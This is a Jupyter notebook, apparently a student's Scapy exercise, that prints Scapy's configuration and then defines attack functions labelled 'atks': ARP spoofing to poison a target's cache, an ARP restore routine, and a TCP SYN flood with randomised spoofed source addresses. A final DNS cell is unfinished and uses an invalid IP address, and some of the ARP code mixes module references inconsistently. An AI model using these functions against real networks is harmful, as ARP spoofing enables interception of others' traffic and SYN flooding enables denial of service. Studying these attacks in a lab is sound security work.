{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "Setup"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "from scapy.layers.inet import *\n",
    "from scapy.layers.dns import *\n",
    "from scapy.layers.l2 import *"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "ASN1_default_codec = <ASN1Codec BER[1]>\n",
       "AS_resolver = <scapy.as_resolvers.AS_resolver_multi object at 0x00000279850F...\n",
       "BTsocket   = <BluetoothRFCommSocket: read/write packets on a connected L2CAP...\n",
       "L2listen   = <L2pcapListenSocket: read packets at layer 2 using libpcap>\n",
       "L2socket   = <L2pcapSocket: read/write packets at layer 2 using only libpcap>\n",
       "L3socket   = <L3pcapSocket: read/write packets at layer 3 using only libpcap>\n",
       "L3socket6  = functools.partial(<L3pcapSocket: read/write packets at layer 3 ...\n",
       "USBsocket  = None\n",
       "auto_crop_tables = True\n",
       "auto_fragment = True\n",
       "bufsize    = 65536\n",
       "cache_pcapiflist = {'\\\\Device\\\\NPF_{D468EA4D-E96E-4798-B7D9-A7906FB742D1}': ...\n",
       "checkIPID  = False\n",
       "checkIPaddr = True\n",
       "checkIPinIP = True\n",
       "checkIPsrc = True\n",
       "check_TCPerror_seqack = False\n",
       "color_theme = <NoTheme>\n",
       "commands   = IPID_count : Identify IP id values classes in a list of packets...\n",
       "contribs   = {}\n",
       "crypto_valid = False\n",
       "crypto_valid_advanced = False\n",
       "debug_dissector = False\n",
       "debug_match = False\n",
       "debug_tls  = False\n",
       "default_l2 = <class 'scapy.packet.Raw'>\n",
       "dot15d4_protocol = None\n",
       "emph       = <Emphasize []>\n",
       "except_filter = ''\n",
       "extensions_paths = '.'\n",
       "fancy_prompt = True\n",
       "filter     = ''\n",
       "geoip_city = None\n",
       "histfile   = 'C:\\\\Users\\\\DD\\\\.scapy_history'\n",
       "iface      = <NetworkInterface_Win MediaTek Wi-Fi 6 MT7921 Wireless LAN Card...\n",
       "ifaces     = Source Index Name MAC IPv4 IPv6 libpcap 1 Software Loopback Int...\n",
       "interactive = False\n",
       "interactive_shell = ''\n",
       "ipv6_enabled = True\n",
       "l2types    = 0x0 -> Loopback (Loopback) 0x1 <- Dot3 (802.3) 0x1 <-> Ether (E...\n",
       "l3types    = 0x3 -> IP (IP) 0x800 <-> IP (IP) 0x806 <-> ARP (ARP) 0x86dd <->...\n",
       "layers     = Packet : <member 'name' of 'Packet' objects> NoPayload : <membe...\n",
       "load_layers = ['bluetooth', 'bluetooth4LE', 'dhcp', 'dhcp6', 'dns', 'dot11',...\n",
       "logLevel   = 30\n",
       "loopback_name = '\\\\Device\\\\NPF_Loopback'\n",
       "manufdb    = <C:\\Program Files\\wireshark\\manuf - 46758 elements>\n",
       "mib        = <MIB - 342 elements>\n",
       "min_pkt_size = 60\n",
       "neighbor   = Ether -> LLC Dot3 -> LLC Dot3 -> SNAP Ether -> Dot1Q Ether -> A...\n",
       "netcache   = arp_cache: 0 valid items. Timeout=120s in6_neighbor: 0 valid it...\n",
       "noenum     = <Resolve []>\n",
       "padding    = 1\n",
       "padding_layer = <class 'scapy.packet.Padding'>\n",
       "prog       = cmd = 'C:\\\\Windows\\\\system32\\\\cmd.exe' cscript = 'C:\\\\Windows\\\\...\n",
       "promisc    = True\n",
       "prompt     = '>>> '\n",
       "raise_no_dst_mac = False\n",
       "raw_layer  = <class 'scapy.packet.Raw'>\n",
       "raw_summary = False\n",
       "recv_poll_rate = 0.05\n",
       "resolve    = <Resolve []>\n",
       "route      = Network Netmask Gateway Iface Output IP Metric 0.0.0.0 0.0.0.0 ...\n",
       "route6     = Destination Next Hop Iface Src candidates Metric ::1/128 :: Sof...\n",
       "session    = ''\n",
       "sniff_promisc = 1\n",
       "stats_classic_protocols = [<class 'scapy.layers.inet.TCP'>, <class 'scapy.la...\n",
       "stats_dot11_protocols = [<class 'scapy.layers.inet.TCP'>, <class 'scapy.laye...\n",
       "stealth    = 'not implemented'\n",
       "temp_files = []\n",
       "teredoPrefix = '2001::'\n",
       "teredoServerPort = 3544\n",
       "use_bpf    = False\n",
       "use_npcap  = True\n",
       "use_pcap   = True\n",
       "use_pypy   = False\n",
       "verb       = 2\n",
       "version    = '2.4.5'\n",
       "warning_threshold = 5\n",
       "wepkey     = ''"
      ]
     },
     "execution_count": 3,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# checking scapy's configuration\n",
    "conf"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "defining function for atks\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "def arp_spoof(target_ip, gateway_ip):\n",
    "    '''\n",
    "    向target_ip发布ARP响应，让本机的mac地址成为网关ip的mac地址\n",
    "    :param target_ip: 被欺骗方的IP\n",
    "    :param gateway_ip: 欺骗网关IP\n",
    "    :return:\n",
    "    '''\n",
    "    # op=2表示arp报文为响应报文，op=1表示广播\n",
    "    packet = scapy.ARP\n",
    "    packet = ARP(op=2, pdst=target_ip, hwdst=scapy.getmacbyip(target_ip), psrc=gateway_ip)\n",
    "    send(packet, verbose=False)\n",
    "\n",
    "def arp_restore(destination_ip, source_ip):\n",
    "    destination_mac = getmacbyip(destination_ip)\n",
    "    source_mac = getmacbyip(source_ip)\n",
    "    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)\n",
    "    scapy.send(packet, verbose=False)\n",
    "\n",
    "def tcp_syn_flooding(target_ip, sport, dport):\n",
    "    src = RandIP()\n",
    "    dst = target_ip\n",
    "    pkt = IP(src=src, dst=dst) / TCP(sport=sport, dport=dport, seq=1505066, flags='S')\n",
    "    send(pkt)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "creating DNS packets with Scapy"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "query_url = 'www.baidu.com'\n",
    "dns_pkt_1 = IP(src='192.168.1.139', dst='114.514.114.514')"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.10.7 64-bit",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.10.7"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "6cd7ecbf46b3498f952f614292bd9b98de37d868a382baadab1fa3f5188ed6c2"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
